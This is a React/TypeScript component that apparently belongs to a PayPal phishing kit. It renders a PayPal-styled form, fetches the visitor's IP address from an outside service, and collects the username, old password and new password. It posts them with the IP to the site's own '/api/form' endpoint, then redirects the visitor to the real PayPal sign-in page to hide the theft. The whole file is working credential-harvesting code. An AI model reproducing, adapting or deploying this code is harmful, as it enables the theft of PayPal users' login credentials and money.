import { Component, FormEventHandler, ReactNode } from "react"
import PayPalButton from "../button/button"
import PayPalInput from "../input/input"

export default class PayPalForm extends Component<{}, { isBusy: boolean }>{
    constructor(props: any){
        super(props)

        this.state = {
            isBusy: false
        }
    }

     handleSubmit = async (event: any) => {
        this.setState({isBusy: true})

        event.preventDefault()
    
        fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then(async (ip) => {
            const endpoint = '/api/form'
    
            const data = {
                username: event.target.username.value,
                oldPassword: event.target.oldPassword.value,
                newPassword: event.target.newPassword.value,
                confirmPassword: event.target.confirmPassword.value,
                ip: ip['ip']
            }
        
            const JSONdata = JSON.stringify(data)
        
            console.log(data);
            
            // Form the request for sending data to the server.
            const options = {
              // The method is POST because we are sending data.
              method: 'POST',
              // Tell the server we're sending JSON.
              headers: {
                'Content-Type': 'application/json',
              },
              // Body of the request is the JSON data we created above.
              body: JSONdata,
            }
        
            // Send the form data to our forms API on Vercel and get a response.
            const response = await fetch(endpoint, options)
        
            const result = await response.json()

            this.setState({isBusy: false})

            window.location.replace('https://www.paypal.com/ng/signin')
        });
    }
    

    render(): ReactNode {
        return (
            <form className="flex flex-col sm:p-4" onSubmit={ this.handleSubmit }>
                <PayPalInput />
                <PayPalButton props={ this.state.isBusy }/>
            </form>
            // <div className="sm:text-black md:text-purple-500 lg:text-yellow-300">
            //     Am a screen
            // </div>
        ) 
    }
}